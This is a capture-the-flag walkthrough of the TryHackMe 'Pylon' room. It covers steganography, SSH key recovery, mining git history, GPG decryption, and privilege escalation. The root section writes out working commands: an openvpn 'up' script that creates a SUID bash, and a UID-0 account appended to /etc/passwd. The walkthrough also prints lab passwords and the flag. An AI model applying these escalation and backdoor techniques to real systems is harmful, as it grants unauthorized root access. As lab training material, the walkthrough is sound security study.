# 75 - Pylon (Steganograpgh, GIT, gpg, exploiting openvpn file to gain root)

m Link --> [https://tryhackme.com/room/pylonzf](https://tryhackme.com/room/pylonzf)

### Enumeration

{% code overflow="wrap" lineNumbers="true" %}
```bash
nmap -A -T4 -Pn -sV 10.10.197.145 
```
{% endcode %}

<figure><img src=".gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>

Download and analyze the file.

### Steganography

Exiftool:

<figure><img src="https://marcorei7.files.wordpress.com/2021/06/exiftool-link.png?w=656" alt="Exiftool" height="69" width="656"><figcaption></figcaption></figure>

In here was a link to CyberChef and a specified recipe. But at that point I didn’t know what to do with it. Then I wanted to use steghide on the picture but it required a passphrase. Here I used stegseek to get the password for it.

<figure><img src="https://marcorei7.files.wordpress.com/2021/06/steg.png?w=594" alt="Stegseek" height="138" width="594"><figcaption></figcaption></figure>

Here I got the password and the textfile from the image. In there was a weird string.

<figure><img src="https://marcorei7.files.wordpress.com/2021/06/pepper-encoded-key.png?w=620" alt="Encoded string" height="122" width="620"><figcaption></figcaption></figure>

When I pasted it to CyberChef I first used the recipe I found with the exiftool. But when I just used from Base64 CyberChef detected a Gzip file.

<figure><img src="https://marcorei7.files.wordpress.com/2021/06/gzip-file-detected.png?w=853" alt="CyberChef Gzip file" height="478" width="853"><figcaption></figcaption></figure>

So I decoded the string with Base64 and saved the output to a file.

{% code overflow="wrap" %}
```bash
dking@dking ~/Downloads$ cat pepper.jpg.out | base64 -d > putput.gzip
dking@dking ~/Downloads$ tar -xvf putput.gzip                                                                   
lone_id                                          
```
{% endcode %}

We get an ssh priv key.

```bash
ssh -i lone_id lone@10.10.111.2 -p 222
```

We were asked to enter encryption key. So i used the password for the image "pepper" and went to the hint link.

[https://gchq.github.io/CyberChef/#recipe=To\_Hex('None',0)To\_Base85('!-u',false)\&input=cGVwcGVy](https://gchq.github.io/CyberChef/#recipe=To\_Hex\('None',0\)To\_Base85\('!-u',false\)\&input=cGVwcGVy)

<figure><img src=".gitbook/assets/image (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (2) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Selecting 1, then select 2, and we get flag 1.

<figure><img src=".gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Back to main menu. Select 4 to search for passwords, then click enter key, select 1 for "lone" password and we get it.

<figure><img src=".gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>

`long : +2BRkRuE!w7>ozQ4`&#x20;

### initial Access

And logged in via ssh port 22.

<figure><img src=".gitbook/assets/image (5) (1) (1).png" alt=""><figcaption></figcaption></figure>

We also have a couple more interesting file’s / folders to look at, one being a file encrypted with gpg the other being a folder with the sources for the password manager and a .git folder in Lone home dir.

### Priv Esc to Pood user

### Git Repo Analysis

I executed this command to get the logs.

`git log`&#x20;

<figure><img src="https://marcorei7.files.wordpress.com/2021/06/git-logs.png?w=501" alt="Git log" height="288" width="501"><figcaption></figcaption></figure>

I looked at the first commit with:

`git show cfc14d599b9b3cf24f909f66b5123ee0bbccc8da`&#x20;

and went through the code. Because I wasn’t able to find anything useful I searched for more commands and used [this list](https://www.ubuntupit.com/useful-git-commands-for-linux-admins-and-developers/) for it.

`git checkout cfc14d599b9b3cf24f909f66b5123ee0bbccc8da`

With this I was able to inspect the files at that point.

<figure><img src="https://marcorei7.files.wordpress.com/2021/06/checkout.png?w=464" alt="Different git content" height="196" width="464"><figcaption></figcaption></figure>

Those were different than before and I executed them with Python3. When I executed the last file I got to the password manager mask again.

`python3 pylon_pwMan.py`

It required the encryption key again and I reused the one from before. Here I had some more options to choose from. "KEY" --> `2_[-I2_[0E2DmEK` .

<figure><img src="https://marcorei7.files.wordpress.com/2021/06/pylon-list.png?w=318" alt="pylon different overview" height="311" width="318"><figcaption></figcaption></figure>

I listed the passwords with “1” and got an entry with the GPG key.

Select 2 to decrypty the password, and select 1 to view the password.

```bash
Password for pylon.thm_gpg_key

        Username = lone_gpg_key
        Password = zr7R0T]6zvYl*~OD            

[*] Install xclip to copy to clipboard.
[*] sudo apt install xclip

[*] Password copied to the clipboard.

Press ENTER to continue.
```

We now have the password for the `note_from_pood.gpg` file in the home dir.

```bash
gpg --decrypt note_from_pood.gpg
```

Decrypted.

```bash
lone@pylon:~$ cat decrypted_file.txt
Hi Lone,

Can you please fix the openvpn config?

It's not behaving itself again.

oh, by the way, my password is yn0ouE9JLR3h)`=I

Thanks again.
```

We got password for pood. `su pood` .

### Priv Esc to root

`sudo -l` - we can run openvpn as root.

<figure><img src=".gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>

Reading the man page for openvpn we see that we can run a script on successful connection to a VPN server, so lets write a script to take control of the machine.

I created a `up.sh` file in /tmp dir.

```bash
lone@pylon:~$ cat /tmp/up.sh 
#!/bin/bash

cp /bin/bash /tmp
chmod 4777 /tmp/bash

# give everybody full access to the script.
chmod 777 /tmp/up.sh
```

Now we edit the openvpn file.

```bash
sudoedit /opt/openvpn/client.ovpn
```

<figure><img src=".gitbook/assets/image (7) (1) (1).png" alt=""><figcaption></figcaption></figure>

Switch back to "Lone" user and run the openvpn file as root.&#x20;

```bash
lone@pylon:~$ sudo /usr/sbin/openvpn /opt/openvpn/client.ovpn
```

<figure><img src=".gitbook/assets/image (8) (1) (1).png" alt=""><figcaption></figcaption></figure>

It was successful, now check /tmp dir.

```
ls -l /tmp
```

And we see `bash` there with the SUID bit set.

```bash
lone@pylon:/tmp$ ./bash -p
bash-4.4# id
uid=1002(lone) gid=1002(lone) euid=0(root) groups=1002(lone)
bash-4.4# whoami
root
bash-4.4# 

```

But we can't decrypt the root.txt.gpg file

```bash
bash-4.4# gpg -d root.txt.gpg 
gpg: can't open 'root.txt.gpg': Permission denied
gpg: decrypt_message failed: Permission denied

```

We will need a proper root shell for this.

What we can do is to add another user called `root2` -

```bash
nano /etc/passwd

# pasted this entry in the end of the file.
root2:WVLY0mgH0RtUI:0:0:root:/root:/bin/bash

# switch.
su root2
root@pylon:~/.gnupg# su root2
root@pylon:/home/pood/.gnupg# cd /root
root@pylon:~# ls -al
total 36
drwx------  5 root root 4096 Jan 30  2021 .
drwxr-xr-x 24 root root 4096 Mar 30  2021 ..
lrwxrwxrwx  1 root root    9 Jan 30  2021 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwx------  4 root root 4096 Jan 30  2021 .gnupg
drwxr-xr-x  3 root root 4096 Jan 30  2021 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwxr-xr-x  2 root root 4096 Jan 30  2021 .vim
-rw-------  1 root root  757 Jan 30  2021 .viminfo
-rw-r--r--  1 root root  492 Jan 27  2021 root.txt.gpg
root@pylon:~# gpg root.txt.gpg 
gpg: WARNING: no command supplied.  Trying to guess what you mean ...
gpg: Note: secret key 91B77766BE20A385 expired at Fri Jan 27 19:04:03 2023 UTC
gpg: encrypted with 3072-bit RSA key, ID 91B77766BE20A385, created 2021-01-27
      "I am g ROOT <root@pylon.thm>"
root@pylon:~# ls
root.txt  root.txt.gpg
root@pylon:~# cat root.txt
ThM{OpenVPN_script_pwn}
root@pylon:~# 

```

<figure><img src=".gitbook/assets/image (493).png" alt=""><figcaption></figcaption></figure>

Done!

